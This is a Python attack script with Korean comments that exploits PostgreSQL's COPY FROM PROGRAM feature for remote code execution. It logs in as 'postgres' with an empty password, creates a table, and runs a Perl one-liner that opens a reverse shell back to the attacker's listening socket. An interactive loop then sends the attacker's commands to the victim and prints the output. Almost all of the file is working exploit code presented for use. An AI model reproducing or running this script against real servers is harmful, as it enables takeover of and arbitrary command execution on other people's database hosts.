# -*- coding: utf-8 -*-
import psycopg2
from psycopg2.extras import RealDictCursor
import multiprocessing
import socket

def PG_RCE():
    RHOST = input("INPUT RHOST IP : ")
    RPORT = input("INPUT RHOST IP : ")
    LHOST = input("INPUT LHOST IP : ")
    LPORT = int(input("Input Listening Port : ")) # 피해 대상이 연결을 시도할 포트번호

    r_shell = multiprocessing.Process(target=do_reverse_connection,
                                      args=((RHOST,RPORT,LHOST,LPORT))) #reverse shell 프로세스 생성

    rvs_server = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # TCP 소켓 생성
    rvs_server.bind((LHOST, LPORT)) #공격자의 IP와, 피해 대상이 접속할 포트를 바인딩
    rvs_server.listen(1) # 1개의 커넥션만 연결허용, 피해 대상을 기다림

    r_shell.start() # reverse shell 프로세스 시작

    conn, addr = rvs_server.accept() # 연결 시도 시 접속 허용, 접속자와의 Connection과 주소를 각 변수로 반환
    print("Client Connect ", addr)

    while True:
        cmd = (input("(-1 to Exit)\n>> ")+"\n").encode('ascii') # 공격자에게 명령어를 입력받는 부분

        if cmd == -1:
            conn.close()
            exit(0)

        conn.sendall(cmd)       # 피해 대상에게 명령어를 전송하는 부분
        print(conn.recv(4096))  # 피해 대상으로부터 명령어에 대한 결과값을 받아 출력하는 부분


def do_reverse_connection(RHOST, RPORT, LHOST, LPORT):

    USER, PW, DB = "postgres", "", "template1"

    conn = psycopg2.connect(database=DB, host=RHOST, user=USER, password=PW, port=RPORT)
    pcur=conn.cursor(cursor_factory=RealDictCursor)

    cmd_list = [
            'DROP TABLE IF EXISTS RCE_BASE;',
            'CREATE TABLE RCE_BASE(filename text);',
            """COPY RCE_BASE FROM PROGRAM 'perl -MIO -e ''$p=fork;exit,if($p);
            $c=new IO::Socket::INET(PeerAddr,"{}:{}");STDIN->fdopen($c,r);$~->fdopen($c,w);
            system$_ while<>;''';""".format(LHOST,LPORT),
            'DROP TABLE IF EXISTS RCE_BASE;',
           ]

    [pcur.execute(cmd) for cmd in cmd_list]

if __name__ in "__main__" :
    PG_RCE()
